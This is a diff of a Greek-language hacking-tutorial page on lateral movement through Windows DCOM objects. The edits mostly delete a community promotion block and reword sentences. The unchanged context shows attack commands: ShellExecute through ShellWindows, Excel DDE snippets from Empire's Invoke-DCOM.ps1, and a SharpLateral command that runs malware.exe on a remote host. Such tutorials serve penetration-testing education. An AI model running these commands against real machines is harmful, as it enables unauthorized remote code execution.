@@ -15,19 +15,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## MMC20.Application
 
 **Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, ελέγξτε την αρχική ανάρτηση από [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
 
-Τα αντικείμενα του Distributed Component Object Model (DCOM) προσφέρουν μια ενδιαφέρουσα δυνατότητα για αλληλεπιδράσεις με αντικείμενα μέσω δικτύου. Η Microsoft παρέχει εκτενή τεκμηρίωση τόσο για το DCOM όσο και για το Component Object Model (COM), προσβάσιμη [εδώ για το DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) και [εδώ για το COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Μια λίστα εφαρμογών DCOM μπορεί να ανακτηθεί χρησιμοποιώντας την εντολή PowerShell:
+Τα αντικείμενα του Distributed Component Object Model (DCOM) προσφέρουν μια ενδιαφέρουσα δυνατότητα για αλληλεπιδράσεις με αντικείμενα μέσω δικτύου. Η Microsoft παρέχει εκτενή τεκμηρίωση τόσο για το DCOM όσο και για το Component Object Model (COM), προσβάσιμη [εδώ για το DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) και [εδώ για το COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Μια λίστα με τις εφαρμογές DCOM μπορεί να ανακτηθεί χρησιμοποιώντας την εντολή PowerShell:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
@@ -57,7 +49,7 @@ ls \\10.10.10.10\c$\Users
 
 **Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, ελέγξτε την αρχική ανάρτηση [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
-Το **MMC20.Application** αντικείμενο αναγνωρίστηκε ότι στερείται ρητών "LaunchPermissions," προεπιλέγοντας άδειες που επιτρέπουν την πρόσβαση στους Διαχειριστές. Για περισσότερες λεπτομέρειες, μπορεί να εξερευνηθεί ένα νήμα [εδώ](https://twitter.com/tiraniddo/status/817532039771525120), και συνιστάται η χρήση του [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET για φιλτράρισμα αντικειμένων χωρίς ρητή Άδεια Εκκίνησης.
+Το **MMC20.Application** αντικείμενο αναγνωρίστηκε ότι στερείται ρητών "LaunchPermissions," προεπιλέγοντας δικαιώματα που επιτρέπουν την πρόσβαση στους Διαχειριστές. Για περισσότερες λεπτομέρειες, μπορεί να εξερευνηθεί ένα νήμα [εδώ](https://twitter.com/tiraniddo/status/817532039771525120), και συνιστάται η χρήση του [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET για φιλτράρισμα αντικειμένων χωρίς ρητή Άδεια Εκκίνησης.
 
 Δύο συγκεκριμένα αντικείμενα, `ShellBrowserWindow` και `ShellWindows`, επισημάνθηκαν λόγω της έλλειψης ρητών Αδειών Εκκίνησης. Η απουσία μιας καταχώρισης `LaunchPermission` στο μητρώο κάτω από `HKCR:\AppID\{guid}` σημαίνει ότι δεν υπάρχουν ρητές άδειες.
 
@@ -73,9 +65,9 @@ $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\sy
 ```
 ### Lateral Movement with Excel DCOM Objects
 
-Η πλευρική κίνηση μπορεί να επιτευχθεί εκμεταλλευόμενη τα αντικείμενα DCOM Excel. Για λεπτομερείς πληροφορίες, είναι σκόπιμο να διαβάσετε τη συζήτηση σχετικά με την εκμετάλλευση του Excel DDE για πλευρική κίνηση μέσω DCOM στο [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
+Η πλευρική κίνηση μπορεί να επιτευχθεί εκμεταλλευόμενη τα αντικείμενα DCOM Excel. Για λεπτομερείς πληροφορίες, είναι σκόπιμο να διαβάσετε τη συζήτηση σχετικά με την εκμετάλλευση του Excel DDE για πλευρική κίνηση μέσω DCOM στο [blog της Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
 
-Το έργο Empire παρέχει ένα σενάριο PowerShell, το οποίο δείχνει τη χρήση του Excel για απομακρυσμένη εκτέλεση κώδικα (RCE) μέσω της χειραγώγησης αντικειμένων DCOM. Παρακάτω παρατίθενται αποσπάσματα από το σενάριο που είναι διαθέσιμο στο [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), που παρουσιάζουν διάφορες μεθόδους για την κακή χρήση του Excel για RCE:
+Το έργο Empire παρέχει ένα σενάριο PowerShell, το οποίο δείχνει τη χρήση του Excel για απομακρυσμένη εκτέλεση κώδικα (RCE) μέσω της χειραγώγησης αντικειμένων DCOM. Παρακάτω παρατίθενται αποσπάσματα από το σενάριο που είναι διαθέσιμο στο [GitHub repository του Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), που παρουσιάζουν διάφορες μεθόδους για την κακή χρήση του Excel για RCE:
 ```powershell
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
@@ -102,7 +94,7 @@ $Obj.DDEInitiate("cmd", "/c $Command")
 
 Δύο εργαλεία επισημαίνονται για την αυτοματοποίηση αυτών των τεχνικών:
 
-- **Invoke-DCOM.ps1**: Ένα σενάριο PowerShell που παρέχεται από το έργο Empire και απλοποιεί την κλήση διαφορετικών μεθόδων για την εκτέλεση κώδικα σε απομακρυσμένες μηχανές. Αυτό το σενάριο είναι προσβάσιμο στο αποθετήριο GitHub του Empire.
+- **Invoke-DCOM.ps1**: Ένα σενάριο PowerShell που παρέχεται από το έργο Empire και απλοποιεί την κλήση διαφόρων μεθόδων για την εκτέλεση κώδικα σε απομακρυσμένες μηχανές. Αυτό το σενάριο είναι προσβάσιμο στο αποθετήριο GitHub του Empire.
 
 - **SharpLateral**: Ένα εργαλείο σχεδιασμένο για την εκτέλεση κώδικα απομακρυσμένα, το οποίο μπορεί να χρησιμοποιηθεί με την εντολή:
 ```bash
@@ -119,12 +111,6 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 
 * [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 * [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
-
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
